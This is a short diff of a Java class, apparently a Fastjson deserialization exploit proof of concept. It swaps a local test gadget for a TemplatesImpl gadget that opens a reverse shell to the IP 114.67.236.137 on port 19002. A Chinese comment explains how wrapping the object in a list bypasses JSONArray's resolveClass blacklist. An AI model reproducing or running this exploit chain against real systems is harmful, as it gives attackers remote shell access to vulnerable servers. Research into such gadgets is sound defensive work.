@@ -39,8 +39,8 @@ public class FJ1{
 
         List<Object> list = new ArrayList<>();
 
-        TemplatesImpl templates = GadgetUtils.templatesImplLocalWindows();
-
+//        TemplatesImpl templates = GadgetUtils.templatesImplLocalWindows();
+        TemplatesImpl templates = GadgetUtils.getTemplatesImplReverseShell("114.67.236.137","19002");
         list.add(templates);          //第一次添加为了使得templates变成引用类型从而绕过JsonArray的resolveClass黑名单检测
 
         JSONArray jsonArray = new JSONArray();
